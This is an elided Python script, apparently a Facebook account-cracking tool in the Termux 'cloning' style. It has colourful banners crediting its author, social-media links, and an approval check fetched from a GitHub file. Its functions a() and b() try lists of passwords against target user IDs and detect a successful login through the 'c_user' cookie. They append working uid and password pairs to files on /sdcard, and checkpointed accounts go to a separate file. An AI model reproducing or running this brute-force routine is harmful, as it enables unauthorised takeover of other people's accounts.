...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By 𝐉𝐀𝐇𝐈𝐃")
...
os.system("clear")
print(" \033[92;1m FOLLOW US ON FACEBOOK ")
os.system("xdg-open https://www.facebook.com/jahid.ahmad54768?mibextid=ZbWKwL")
logo=("""\033[92;1m
...
\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \33[97;1m𝐉𝐀𝐇𝐈𝐃 𝐒𝐇𝐄𝐈𝐊𝐇 ♚   \033[38;5;46m               ▇▎ 
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92m𝐉𝐀𝐇𝐈𝐃 𝐒𝐇𝐄𝐈𝐊𝐇   \033[38;5;46m           ▇▎  
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \033[38;5;196m: \033[1;92m+𝟖𝟖01957550919 \033[38;5;46m                  ▇▎
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/𝐉𝐀𝐇𝐈𝐃-𝐆𝐒𝐓\033[38;5;46m ▇▎
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801957550919');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/im.not.a.king.bt.im.kingmeker');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/𝐉𝐀𝐇𝐈𝐃-NIZAMI');time.sleep(1)
		admin()
	if bal =='0':
		Main()
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "𝐉𝐀𝐇𝐈𝐃-𝐌-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\033[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  ...
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/jahid-gst/JAHID-XX/main/Apruval.txt").text 
    if id in httpCaht: 
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐉𝐀𝐇𝐈𝐃\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/𝐉𝐀𝐇𝐈𝐃-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/𝐉𝐀𝐇𝐈𝐃-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[𝐉𝐀𝐇𝐈𝐃] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}𝐉𝐀𝐇𝐈𝐃{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/𝐉𝐀𝐇𝐈𝐃-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
